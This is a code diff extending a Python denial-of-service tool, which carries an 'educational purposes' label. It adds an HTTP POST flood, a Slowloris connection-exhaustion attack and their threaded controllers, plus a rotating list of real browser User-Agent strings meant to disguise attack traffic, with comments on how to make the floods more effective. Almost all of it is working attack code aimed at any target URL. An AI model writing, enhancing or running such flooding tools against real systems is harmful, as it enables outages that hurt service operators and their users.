@@ -13,6 +13,17 @@ from scapy.layers.inet import IP, ICMP, TCP
 # WARNING: This is a Denial of Service (DoS) script for educational purposes.
 # ==============================================================================
 
+# --- NEW: USER AGENT LIST FOR REALISTIC HEADERS ---
+# A list of real-world User-Agent strings to make requests look more legitimate.
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+]
+
 # --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
 
 def resolve_to_ipv4(target_url):
@@ -186,7 +197,114 @@ def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
 
 
 # --- HTTP Flood ---
-def http_worker(stop_event, pause_event, target_ip, port, host_header):
+# --- NEW: HTTP POST Flood Worker ---
+# This is more effective than a GET flood as it often bypasses caches and forces
+# server-side processing, consuming more CPU and database resources.
+def http_post_worker(stop_event, pause_event, target_ip, port, host_header):
+    """Worker thread that sends a continuous stream of HTTP POST requests."""
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(4)
+                s.connect((target_ip, port))
+
+                # Generate random data for the POST body
+                post_data = "".join(random.sample(string.ascii_letters + string.digits, 100))
+                user_agent = random.choice(USER_AGENTS)
+
+                # Craft the POST request with realistic headers
+                request = (
+                    f"POST / HTTP/1.1\n"  # Using root path, but a specific path like /login.php can be more effective
+                    f"Host: {host_header}\n"
+                    f"User-Agent: {user_agent}\n"
+                    f"Content-Type: application/x-www-form-urlencoded\n"
+                    f"Content-Length: {len(post_data)}\n"
+                    f"Connection: close\n\n"
+                    f"{post_data}"
+                ).encode()
+
+                s.send(request)
+        except socket.error:
+            time.sleep(0.5)
+
+
+# --- NEW: Slowloris Attack Worker ---
+# This is a "low and slow" attack. It holds connections open by sending partial
+# data, exhausting the server's connection pool without a high volume of traffic.
+def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
+    """Worker thread that opens and maintains a single Slowloris connection."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target_ip, port))
+
+        # Send initial, incomplete headers to open the connection
+        user_agent = random.choice(USER_AGENTS)
+        initial_headers = (
+            f"GET /?{random.randint(0, 2000)} HTTP/1.1\n"
+            f"Host: {host_header}\n"
+            f"User-Agent: {user_agent}\n"
+        ).encode()
+        s.send(initial_headers)
+
+        # Main loop to keep the connection alive
+        while not stop_event.is_set():
+            if pause_event.is_set():
+                time.sleep(1)
+                continue
+            try:
+                # Send a "keep-alive" header periodically
+                keep_alive_header = f"X-a: {random.randint(1, 5000)}\n".encode()
+                s.send(keep_alive_header)
+                time.sleep(15)  # The "slow" part of the attack
+            except socket.error:
+                break  # Server likely closed the connection, so this thread is done
+    except socket.error:
+        pass  # Initial connection failed, thread terminates
+    finally:
+        s.close()
+
+
+# --- NEW: HTTP POST Flood Controller ---
+def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150):
+    """Controller for HTTP POST flood attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(target=http_post_worker, args=(stop_event, pause_event, ip, port, target_url))
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
+# --- NEW: Slowloris Attack Controller ---
+def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200):
+    """Controller for Slowloris attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(sockets):
+            t = threading.Thread(target=slowloris_worker, args=(stop_event, pause_event, ip, port, target_url))
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
+def http_get_worker(stop_event, pause_event, target_ip, port, host_header):
     """Worker thread that sends a continuous stream of HTTP GET requests."""
     while not stop_event.is_set():
         if pause_event.is_set():
@@ -214,7 +332,7 @@ def attack_http_flood(target_url, port, duration, stop_event, pause_event, threa
 
     for ip in ips:
         for _ in range(threads):
-            t = threading.Thread(target=http_worker, args=(stop_event, pause_event, ip, port, target_url))
+            t = threading.Thread(target=http_get_worker, args=(stop_event, pause_event, ip, port, target_url))
             t.daemon = True
             t.start()
             all_threads.append(t)
